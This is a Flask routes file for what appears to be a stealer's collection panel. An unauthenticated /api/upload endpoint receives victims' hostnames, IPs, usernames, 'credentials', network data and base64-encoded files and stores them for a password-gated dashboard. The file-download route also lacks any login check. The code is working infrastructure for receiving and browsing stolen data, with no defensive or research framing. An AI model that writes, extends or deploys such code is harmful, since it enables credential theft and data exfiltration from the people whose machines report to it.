from flask import Blueprint, render_template, request, jsonify, current_app, send_file, session, redirect, url_for
from .models import db, Device, Credential, File, Network
import base64, os, io
from functools import wraps
from werkzeug.utils import secure_filename

main = Blueprint("main", __name__)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("authenticated"):
            return redirect(url_for("main.login"))
        return f(*args, **kwargs)
    return decorated

@main.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("password") == current_app.config["PASSWORD"]:
            session["authenticated"] = True
            return redirect(url_for("main.index"))
        error = "Mot de passe incorrect"
    return render_template("login.html", error=error)

@main.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("main.login"))

@main.route("/")
@login_required
def index():
    devices = Device.query.all()
    return render_template("index.html", devices=devices)


@main.route("/device/<int:device_id>")
@login_required
def device(device_id):
    device = Device.query.get_or_404(device_id)
    return render_template("device.html", device=device)

@main.route('/file/<int:file_id>/download')
def download_file(file_id):
    file = File.query.get_or_404(file_id)
    base = os.path.splitext(file.filename)[0]
    return send_file(
        io.BytesIO(file.data),
        download_name=base + ".txt",
        as_attachment=True,
        mimetype="text/plain"
    )

@main.route("/api/upload", methods=["POST"])
def upload():
    data = request.get_json()

    device = Device(
        name=data.get("os") + " | " + data.get("hostname"),
        hostname=data.get("hostname"),
        ip=data.get("ip"),
        os=data.get("os"),
        user=data.get("user"),
        hardware=data.get("hardware", ""),
        software=data.get("software", ""),
    )

    db.session.add(device)
    db.session.flush()

    for cred in data.get("credentials", []):
        db.session.add(Credential(data=cred, device=device))

    for net in data.get("network", []):
        db.session.add(Network(connection=net, device=device))

    for f in data.get("files", []):
        original_name = secure_filename(f["filename"])
        try:
            file_bytes = base64.b64decode(f["data"], validate=True)
        except Exception:
            db.session.rollback()
            return {"error": "invalid base64"}, 400

        db.session.add(File(
            filename=original_name,
            data=file_bytes,
            device=device
        ))

    try:
        db.session.commit()
    except Exception:
        db.session.rollback()
        raise

    return jsonify({"status": "ok"})
